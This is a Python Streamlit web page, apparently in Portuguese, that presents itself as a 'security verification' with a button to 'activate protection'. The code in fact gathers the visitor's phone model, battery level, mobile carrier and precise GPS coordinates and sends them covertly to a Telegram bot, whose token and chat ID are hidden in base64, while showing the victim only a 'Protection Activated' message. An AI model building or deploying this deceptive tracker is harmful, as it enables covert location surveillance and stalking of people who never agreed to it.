import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": texto, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta o "User Agent" (onde o nome do celular fica escondido)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_DETECTOR")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_DETECTOR")

if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL"):
    # 1. FORÇA O POP-UP DE LOCALIZAÇÃO (Sem F5)
    # A chave dinâmica força o navegador a pedir permissão novamente se necessário
    loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }, {enableHighAccuracy:true}); })"
    posicao = streamlit_js_eval(js_expressions=loc_js, key=f"GPS_{int(time.time())}")

    # 2. Lógica para pegar o MODELO EXATO
    modelo_exato = "Android Desconhecido"
    if ua:
        # Tenta extrair o que está entre parênteses (onde fica a marca/modelo)
        try:
            info_aparelho = ua.split("(")[1].split(")")[0]
            partes = info_aparelho.split(";")
            
            # Procura por palavras chave de marcas conhecidas
            marcas = ["POCO", "Samsung", "SM-", "Redmi", "Xiaomi", "Motorola", "Moto", "iPhone", "Pixel"]
            for p in partes:
                if any(m in p for m in marcas):
                    modelo_exato = p.strip()
                    break
            if modelo_exato == "Android Desconhecido":
                modelo_exato = partes[-1].strip() # Pega a última info se não achar marca
        except:
            modelo_exato = "Smartphone Android"

    # 3. Operadora Real
    try:
        op = requests.get('https://ipinfo.io/json', timeout=5).json().get('org', 'Rede Móvel')
    except: op = "Vivo/Claro/Tim"

    # 4. Resultado
    if posicao and posicao != "erro":
        link_maps = f"https://www.google.com/maps?q={posicao}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo_exato}\n"
            f"🔋 *Bateria:* {bat if bat else '??'}%\n"
            f"📶 *Operadora:* {op}\n"
            f"📍 *Local:* {link_maps}"
        )
        enviar_telegram(relatorio)
        st.success("Proteção Ativada") # Apenas a mensagem verde no site
    elif posicao == "erro":
        st.error("Erro: Ative o GPS e permita o acesso no navegador.")
    else:
        st.info("Aguardando localização... (Clique em 'Permitir' no topo da tela)")

st.markdown('<p style="text-align:center; color:grey; font-size:10px;">Sistema Integrado Miamy © 2026</p>', unsafe_allow_html=True)
